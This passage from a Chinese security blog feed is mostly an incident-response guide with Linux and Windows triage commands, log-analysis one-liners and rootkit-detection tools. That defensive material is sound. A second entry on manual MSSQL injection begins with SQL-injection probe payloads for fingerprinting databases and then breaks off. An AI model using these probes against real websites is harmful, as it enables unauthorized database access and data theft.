    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-113.png" alt="upload successful"></p><h1 id="一-什么是应急响应"><a href="#一-什么是应急响应" class="headerlink" title="一.什么是应急响应"></a>一.什么是应急响应</h1><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.Web入侵：挂马、篡改、Webshell，僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息，脱裤、数据库登录（弱口令）</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p><h1 id="二-排查思路"><a href="#二-排查思路" class="headerlink" title="二.排查思路"></a>二.排查思路</h1><p>一个常规的入侵事件后的系统排查思路：</p><p><img src="\images\pasted-110.png" alt="upload successful"></p><h3 id="1-文件分析"><a href="#1-文件分析" class="headerlink" title="1.文件分析"></a>1.文件分析</h3><p>文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p><p>webshell排查分析</p><p>核心应用关联目录文件分析</p><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><p>当前活动进程 &amp; 远程连接 </p><p>启动进程 &amp; 计划任务</p><p>进程工具分析:    windows：Pchunter</p><pre><code>linux:  Chkrootkit&amp;Rkhunter</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><p>系统变量</p><p>环境变量</p><p>history</p><p>系统配置文件</p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p>操作系统日志</p><p>windows事件查看器(eventvwr),  linux( /var/log)</p><p>应用日志分析: access.log     Error.log</p><h1 id="三-分析排查"><a href="#三-分析排查" class="headerlink" title="三.分析排查"></a>三.分析排查</h1><h2 id="Linux分析排查"><a href="#Linux分析排查" class="headerlink" title="Linux分析排查"></a>Linux分析排查</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h5 id="敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）"><a href="#敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）" class="headerlink" title="敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）"></a>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</h5><p> 例如: 查看tmp目录下的文件： <code>ls –alt /tmp/</code></p><p>查看开机启动项内容：<code>ls -alt /etc/init.d/</code></p><p>查看指定目录下文件时间的排序：<code>ls -alt | head -n 10</code></p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改。</p><h5 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h5><p>例如要查找24小时内被修改的文件：</p><p><code>find   ./  -mtime 0 -name “文件名”</code> （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p><p>查找72小时内新增的文件 : <code>find / -ctime -2</code>      -ctime 内容未改变权限改变时候也可以查出</p><p>根据确定时间去反推变更的文件：  <code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p><h5 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件 "></a>特殊权限的文件 </h5><p>查找777的权限的文件 <code>find  / *.jsp   -perm 4777</code></p><h5 id="隐藏的文件"><a href="#隐藏的文件" class="headerlink" title="隐藏的文件"></a>隐藏的文件</h5><p>（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find   grep     ls 核心目的是为了关联推理出可疑文件。</p><p>进程分析</p><h5 id="使用netstat-网络连接命令"><a href="#使用netstat-网络连接命令" class="headerlink" title="使用netstat 网络连接命令"></a>使用netstat 网络连接命令</h5><p>分析可疑端口、可疑IP、可疑PID及程序进程  <code>netstat   –antlp | more</code></p><h5 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a>使用ps命令，分析进程</h5><p><code>ps aux | grep pid | grep –v grep</code></p><h5 id="查看指定端口对应的程序"><a href="#查看指定端口对应的程序" class="headerlink" title="查看指定端口对应的程序"></a>查看指定端口对应的程序</h5><p>使用<code>lsof -i:1677</code></p><h5 id="使用ls-以及-stat-查看系统命令是否被替换"><a href="#使用ls-以及-stat-查看系统命令是否被替换" class="headerlink" title="使用ls 以及 stat 查看系统命令是否被替换"></a>使用ls 以及 stat 查看系统命令是否被替换</h5><p> 两种思路：</p><p>第一种查看命令目录最近的时间排序</p><p>第二种根据确定时间去匹配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ls -alt /usr/bin | head -10 ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</span><br></pre></td></tr></table></figure></p><h5 id="隐藏进程查看"><a href="#隐藏进程查看" class="headerlink" title="隐藏进程查看"></a>隐藏进程查看</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n |uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h5 id="查看分析任务计划"><a href="#查看分析任务计划" class="headerlink" title="查看分析任务计划"></a>查看分析任务计划</h5><p> a.通过<code>crontabl –l</code> 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p><p> b.查看etc目录任务计划相关文件，<code>ls /etc/cron*</code></p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">history (cat /root/.bash_history)</span><br><span class="line">/etc/passwd</span><br><span class="line">crontab  /etc/cron*</span><br><span class="line">rc.local  /etc/init.d chkconfig</span><br><span class="line">last</span><br><span class="line">$PATH</span><br><span class="line">strings</span><br></pre></td></tr></table></figure><h5 id="查看分析history-cat-root-bash-history"><a href="#查看分析history-cat-root-bash-history" class="headerlink" title="查看分析history (cat /root/.bash_history)"></a>查看分析history (cat /root/.bash_history)</h5><p>曾经的命令操作痕迹，以便进一步排查溯源。有可能通过记录关联到如下信息：</p><p>a.wget 远程某主机（域名&amp;IP）的远控文件；</p><p> b.尝试连接内网某主机（ssh scp），便于分析攻击者意图; </p><p>c.打包某敏感数据或代码，tar zip 类命令 </p><p>d.对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p><h5 id="查看分析用户相关分析"><a href="#查看分析用户相关分析" class="headerlink" title="查看分析用户相关分析"></a>查看分析用户相关分析</h5><p>a. <code>useradd userdel</code> 的命令时间变化（stat），以及是否包含可疑信息</p><p> b. <code>cat /etc/passwd</code> 分析可疑帐号，可登录帐号 查看UID为0的帐号：</p><pre><code> `awk  -F: &apos;{if($3==0)print $1}&apos; /etc/passwd `</code></pre><p>c. 查看能够登录的帐号：</p><pre><code>  `cat /etc/passwd | grep -E &quot;/bin/bash$&quot; `</code></pre><p>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p><h5 id="查看linux-开机启动程序"><a href="#查看linux-开机启动程序" class="headerlink" title="查看linux 开机启动程序"></a>查看linux 开机启动程序</h5><p>a.  <code>查看rc.local文件（/etc/init.d/rc.local /etc/rc.local）</code></p><p> b.  <code>ls –alt /etc/init.d/ c) chkconfig</code></p><h5 id="查看系统用户登录信息"><a href="#查看系统用户登录信息" class="headerlink" title="查看系统用户登录信息 "></a>查看系统用户登录信息 </h5><p>a.  使用lastlog命令，系统中所有用户最近一次登录信息。</p><p> b.  使用lastb命令，用于显示用户错误的登录列表 c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp） utmp文件中保存的是当前正在本系统中的用户的信息。 wtmp文件中保存的是登录过本系统的用户的信息。 /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p><h5 id="系统路径分析"><a href="#系统路径分析" class="headerlink" title="系统路径分析"></a>系统路径分析</h5><p><code>echo $PATH</code>分析有无敏感可疑信息</p><h5 id="指定信息检索"><a href="#指定信息检索" class="headerlink" title="指定信息检索 "></a>指定信息检索 </h5><p>a.  strings命令在对象文件或二进制文件中查找可打印的字符串 </p><p>b.  分析sshd 文件，是否包括IP信息</p><h5 id="查看ssh相关目录有无可疑的公钥存在"><a href="#查看ssh相关目录有无可疑的公钥存在" class="headerlink" title="查看ssh相关目录有无可疑的公钥存在"></a>查看ssh相关目录有无可疑的公钥存在</h5><p> a.   Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。 </p><p>b.   目录： /etc/ssh ./.ssh/</p><h3 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h3><p>推荐工具：<br>chkrootkit       rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">www.chkrootkit.org</a> rkhunter.sourceforge.net）</p><h5 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h5><p>(迭代更新了20年)主要功能：<br>1    检测是否被植入后门、木马、rootkit<br>2    检测系统命令是否正常<br>3    检测登录日志<br>4    详细参考README</p><h5 id="rkhunter："><a href="#rkhunter：" class="headerlink" title="rkhunter："></a>rkhunter：</h5><p>1    系统命令（Binary）检测，包括Md5 校验<br>2    Rootkit检测<br>3    本机敏感目录、系统配置、服务及套间异常检测<br>4    三方应用版本检测</p><h5 id="Webshell查找"><a href="#Webshell查找" class="headerlink" title="Webshell查找"></a>Webshell查找</h5><p>Github上存在各种版本的webshell查杀脚本</p><p>通过chkrootkit 、rkhunter、Webshell Check 等手段得出以下应对措施：</p><p>1.根据进程、连接等信息关联的程序，查看木马活动信息</p><p>2.假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。</p><p>3.发现可疑可执行的木马文件，不要急于删除，先打包备份一份。</p><p>4.发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/var/log/message       包括整体系统信息</span><br><span class="line">/var/log/auth.log        包含系统授权信息，包括用户登录和使用的权限机制等</span><br><span class="line">/var/log/userlog         记录所有等级用户信息的日志。</span><br><span class="line">/var/log/cron           记录crontab命令是否被正确的执行</span><br><span class="line">/var/log/xferlog(vsftpd.log)记录Linux FTP日志</span><br><span class="line">/var/log/lastlog         记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">/var/log/secure         记录大多数应用输入的账号与密码，登录成功与否</span><br><span class="line">var/log/wtmp　　      记录登录系统成功的账户信息，等同于命令last</span><br><span class="line">var/log/faillog　　      记录登录系统不成功的账号信息，一般会被黑客删除</span><br></pre></td></tr></table></figure></p><h5 id="日志查看分析"><a href="#日志查看分析" class="headerlink" title="日志查看分析"></a>日志查看分析</h5><p>grep,sed,sort,awk</p><h5 id="基于时间的日志管理："><a href="#基于时间的日志管理：" class="headerlink" title="基于时间的日志管理："></a>基于时间的日志管理：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/wtmp /var/run/utmp /var/log/lastlog(lastlog) /var/log/btmp(lastb)</span><br></pre></td></tr></table></figure><h5 id="登录日志"><a href="#登录日志" class="headerlink" title="登录日志"></a>登录日志</h5><p>可以关注Accepted、Failed password 、invalid特殊关键字</p><h5 id="登录相关命令"><a href="#登录相关命令" class="headerlink" title="登录相关命令"></a>登录相关命令</h5><p> lastlog 记录最近几次成功登录的事件和最后一次不成功的登录</p><h5 id="who-命令查询utmp文件"><a href="#who-命令查询utmp文件" class="headerlink" title="who 命令查询utmp文件"></a>who 命令查询utmp文件</h5><p>Who的缺省输出包括用户名、终端类型、登录日期及远程主机</p><h5 id="w-命令查询utmp文件"><a href="#w-命令查询utmp文件" class="headerlink" title="w 命令查询utmp文件"></a>w 命令查询utmp文件</h5><p>显示当前系统中每个用户和它所运行的进程信息</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p>用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数</p><h5 id="last-命令"><a href="#last-命令" class="headerlink" title="last 命令"></a>last 命令</h5><p>往回搜索wtmp来显示自从文件第一次创建以来登录过的用户</p><h5 id="finger-命令"><a href="#finger-命令" class="headerlink" title="finger 命令"></a>finger 命令</h5><p>用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。</p><h5 id="日志命令"><a href="#日志命令" class="headerlink" title="日志命令"></a>日志命令</h5><p>定位有多少IP在爆破主机的root帐号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure></p><p>登录成功的IP有哪些<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more  </span><br><span class="line"></span><br><span class="line">tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">less demo.log #查看日志文件，支持上下滚屏，查找功能  </span><br><span class="line"></span><br><span class="line">uniq -c demo.log  #标记该行重复的数量，不重复值为1 </span><br><span class="line"></span><br><span class="line">grep -c &apos;ERROR&apos; demo.log   #输出文件demo.log中查找所有包行ERROR的行的数量</span><br></pre></td></tr></table></figure></p><h3 id="相关处置"><a href="#相关处置" class="headerlink" title="相关处置"></a>相关处置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kill -9</span><br><span class="line">chattr –i  加锁</span><br><span class="line">rm</span><br><span class="line">setfacl</span><br><span class="line">ssh</span><br><span class="line">chmod  000  把木马去权限</span><br></pre></td></tr></table></figure><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h4 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h4><ol><li><p>开机启动有无异常文件</p></li><li><p>各个盘下的temp(tmp)相关目录下查看有无异常文件</p></li><li><p>浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息</p></li><li><p>查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。</p></li><li><p>查看用户recent相关文件，通过分析最近打开分析可疑文件</p></li></ol><p> C:\Documents and Settings\Administrator\Recent</p><p> C:\Documents and Settings\Default User\Recent</p><p> 开始,运行 %UserProfile%\Recent</p><ol start="6"><li>根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件</li></ol><h4 id="进程命令"><a href="#进程命令" class="headerlink" title="进程命令"></a>进程命令</h4><ol><li><p><code>netstat -ano</code> 查看目前的网络连接，定位可疑的ESTABLISHED</p></li><li><p>根据netstat 定位出的pid，再通过tasklist命令进行进程定位</p></li><li>通过tasklist命令查看可疑程序</li></ol><h4 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h4><p>1.使用set命令查看变量的设置<br>2.Windows 的计划任务；<br>3.Windows 的帐号信息，如隐藏帐号等<br>4.配套的注册表信息检索查看，SAM文件以及远控软件类<br>5.查看systeminfo 信息，系统版本以及补丁信息 例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）… 若进行漏洞比对，建议使用Windows-Exploit-Suggester <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></p><h4 id="后门排查-1"><a href="#后门排查-1" class="headerlink" title="后门排查"></a>后门排查</h4><p>PC Hunter是一个Windows系统信息查看软件<br><a href="http://www.xuetr.com/" target="_blank" rel="noopener">http://www.xuetr.com/</a></p><p>功能列表如下：</p><p>1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能<br>2.内核驱动模块查看，支持内核驱动模块的内存拷贝</p><p>3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook<br>4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除<br>5.端口信息查看，目前不支持2000系统<br>6.查看消息钩子<br>7.内核模块的iat、eat、inline hook、patches检测和恢复<br>8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除<br>9.注册表编辑<br>10.进程iat、eat、inline hook、patches检测和恢复<br>11.文件系统查看，支持基本的文件操作<br>12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME<br>13.ObjectType Hook检测和恢复<br>14.DPC定时器检测和删除<br>15.MBR Rootkit检测和修复<br>16.内核对象劫持检测<br>17.WorkerThread枚举<br>18.Ndis中一些回调信息枚举<br>19.硬件调试寄存器、调试相关API检测<br>20.枚举SFilter/Fltmgr的回调</p><p>PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p>1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）<br>2.主要分析安全日志，可以借助自带的筛选功能</p><p>3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((?:(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\d|((1\d&#123;2&#125;)|([1-9]?\d))))</span><br></pre></td></tr></table></figure></p><p>4.强大的日志分析工具Log Parser</p><p>#分析IIS日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\Users\sm0nk\Desktop\iis.log&quot; -o:datagrid</span><br></pre></td></tr></table></figure></p><p>比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675&quot;</span><br></pre></td></tr></table></figure></p><p>事件ID是很好的索引</p><p>Windows server 2008系列参考event ID：<br>4624 - 帐户已成功登录<br>4625 - 帐户登录失败<br>4648 - 试图使用明确的凭证登录（例如远程桌面）</p><h4 id="相关处置-1"><a href="#相关处置-1" class="headerlink" title="相关处置"></a>相关处置</h4><p>1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill)<br>2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除<br>3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。</p><p>### </p><h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><p>Apache、tomcat、Nginx、IIS<br>无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find . access_log |grep xargs ip攻击地址</span><br><span class="line">find . access_log| grep xargs 木马文件名</span><br><span class="line">页面访问排名前十的IP</span><br><span class="line">cat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">页面访问排名前十的URL</span><br><span class="line">cat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10</span><br><span class="line">查看最耗时的页面</span><br><span class="line">cat access.log | sort -k 2 -n -r | head 10</span><br></pre></td></tr></table></figure></p><p>在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。</p><p>首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p><img src="\images\pasted-111.png" alt="upload successful"></p><p>一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。</p><p><img src="\images\pasted-112.png" alt="upload successful"></p><h1 id="应急总结"><a href="#应急总结" class="headerlink" title="应急总结"></a>应急总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">核心思路是“顺藤摸瓜”</span><br><span class="line">碎片信息的关联分析</span><br><span class="line">时间范围的界定以及关键操作时间点串联</span><br><span class="line">Web入侵类，shell定位很重要</span><br><span class="line">假设与求证</span><br><span class="line">攻击画像与路线确认</span><br></pre></td></tr></table></figure><h5 id="常见的入侵方式Getshell方法"><a href="#常见的入侵方式Getshell方法" class="headerlink" title="常见的入侵方式Getshell方法 "></a>常见的入侵方式Getshell方法 </h5><p>a) WEB入侵 i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞 </p><p>b) 系统入侵 i. SSH 破解后登录操作 ii. RDP 破解后登录操作 iii. MSSQL破解后远控操作 iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494）</p><p> c) 典型应用 i. Mail暴力破解后信息挖掘及漏洞利用 ii. VPN暴力破解后绕过边界 iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行 iv. Rsync 未授权访问类 v. Mongodb未授权访问类 vi. Elasticsearch命令执行漏洞 vii. Memcache未授权访问漏洞 viii. 服务相关口令（mysql ldap zebra squid vnc smb）</p><h5 id="应急需求有哪些分类："><a href="#应急需求有哪些分类：" class="headerlink" title="应急需求有哪些分类："></a>应急需求有哪些分类：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> a) 被谁入侵了？ 关联 攻击IP 攻击者信息</span><br><span class="line"></span><br><span class="line"> b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息 </span><br><span class="line"></span><br><span class="line">c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息 </span><br><span class="line"></span><br><span class="line">d) 数据是否被窃取？ 关联 日志审计</span><br><span class="line"></span><br><span class="line"> e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营</span><br></pre></td></tr></table></figure><h1 id="资源参考"><a href="#资源参考" class="headerlink" title="资源参考"></a>资源参考</h1><p><a href="https://www.waitalone.cn/linux-find-webshell.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-find-webshell.html</a><br><a href="http://vinc.top/category/yjxy/" target="_blank" rel="noopener">http://vinc.top/category/yjxy/</a><br><a href="http://www.shellpub.com/" target="_blank" rel="noopener">http://www.shellpub.com/</a><br><a href="http://linux.vbird.org/linux_security/0420rkhunter.php" target="_blank" rel="noopener">http://linux.vbird.org/linux_security/0420rkhunter.php</a><br><a href="https://cisofy.com/download/lynis/" target="_blank" rel="noopener">https://cisofy.com/download/lynis/</a><br><a href="https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1" target="_blank" rel="noopener">https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1</a><br><a href="http://www.freebuf.com/articles/web/23358.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/23358.html</a><br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br><a href="http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html" target="_blank" rel="noopener">http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-7462.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-7462.html</a><br><a href="http://bobao.360.cn/learning/detail/3830.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3830.html</a><br><a href="https://yq.aliyun.com/ziliao/65679" target="_blank" rel="noopener">https://yq.aliyun.com/ziliao/65679</a><br><a href="http://secsky.sinaapp.com/188.html" target="_blank" rel="noopener">http://secsky.sinaapp.com/188.html</a><br><a href="http://blog.sina.com.cn/s/blog_d7058b150102wu07.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_d7058b150102wu07.html</a><br><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="noopener">http://www.sleuthkit.org/autopsy/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>手注mssql</title>
    <link href="http://yoursite.com/2018/08/21/mssql/"/>
    <id>http://yoursite.com/2018/08/21/mssql/</id>
    <published>2018-08-21T15:02:22.000Z</published>
    <updated>2018-08-23T14:38:10.165Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-133.png" alt="upload successful"></p><h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h3 id="1-判断数据库类型："><a href="#1-判断数据库类型：" class="headerlink" title="1.判断数据库类型："></a>1.判断数据库类型：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;（撇号）</span><br><span class="line">and (select count(*) from 独有表)&gt;0 </span><br><span class="line">oracle:dual</span><br><span class="line">mssql:sysobjects</span><br><span class="line">mysql:shema</span><br><span class="line">access:mssysobjects</span><br></pre></td></tr></table></figure><h3 id="2-判断版本号："><a href="#2-判断版本号：" class="headerlink" title="2.判断版本号："></a>2.判断版本号：</h3><p>（sqlserver:2000）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 